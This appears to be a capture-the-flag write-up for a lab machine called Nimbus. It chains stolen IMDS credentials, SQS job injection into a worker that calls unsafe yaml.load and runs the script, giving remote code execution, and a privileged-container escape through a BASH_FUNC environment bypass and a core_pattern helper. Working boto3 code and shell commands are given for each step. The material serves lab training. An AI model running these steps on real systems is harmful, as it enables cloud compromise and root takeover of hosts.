- Web app: "Nimbus — Internal Job Scheduler" v1.4.2
- /jobs, /jobs/preview - submit job by Git URL or YAML paste
- /login - disabled ("SSO migrating to Okta" - unauthenticated during migration)

- aws.nimbus.htb returns AWS STS InvalidClientTokenId error (AWS-API emulator)

## AWS Emulator Enumeration

```

export AWS_SECRET_ACCESS_KEY=<from_imds>
export AWS_SESSION_TOKEN=<from_imds>
```

boto3 session with monkey-patched DNS (aws.nimbus.htb → 10.129.16.167) for virtual-host routing:
```python
import boto3, socket
orig = socket.getaddrinfo
def patch(h, *a):
    if h == "aws.nimbus.htb": h = "10.129.16.167"
    return orig(h, *a)
socket.getaddrinfo = patch
c = boto3.client("sts", endpoint_url="http://aws.nimbus.htb")
c.get_caller_identity()
# -> arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a

sqs.list_queues()
# -> http://floci:4566/847219365028/nimbus-jobs
```
- Role scope: sqs:SendMessage only on nimbus-jobs
- "floci" = internal emulator hostname at :4566 (Java/Quarkus LocalStack re-implementation)
- Other services (s3, lambda, ec2) returned AccessDenied — nimbus-web-role is locked to sqs

## SQS Job Injection -> Worker RCE
Worker runs `yaml.load(body, Loader=yaml.Loader)` then `subprocess.run(["python3", "-c", script])`.
- `nimbus-web-role` has `sqs:SendMessage` on `nimbus-jobs`
- Inject a job with `script` field containing arbitrary Python → RCE as `uid=1000(worker)` in Docker container
- No output channel from worker; exfil via HTTP POST back to attacker listener

## Privileged CodeBuild -> core_pattern Host Escape
floci CodeBuild honors `privilegedMode=True` → real `--privileged` Docker container.
- Only pre-pulled image available: `floci/floci:latest`
- Entrypoint gosu-drops to uid 1001 (CodeBuild keepalive `mkdir /codebuild` fails as non-root)
- **Bypass:** `BASH_FUNC_id%%` env var = `() { echo uid=1000; }` → entrypoint skips drop, PID 1 = real root
- Container has `CapEff=0x1ffffffffff` + writable `/proc/sys` (CAP_SYS_ADMIN)

**core_pattern escape (host root):**
```
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
printf '#!/bin/sh\ncat /root/root.txt > %s/rf\n' "$UDIR" > /x.sh
echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern
ulimit -c unlimited; bash -c 'kill -11 $$'  # SIGSEGV -> host runs /x.sh as root
```
`core_pattern` usermode-helper runs as **host root**, copies `/root/root.txt` into container's overlay `upperdir`.
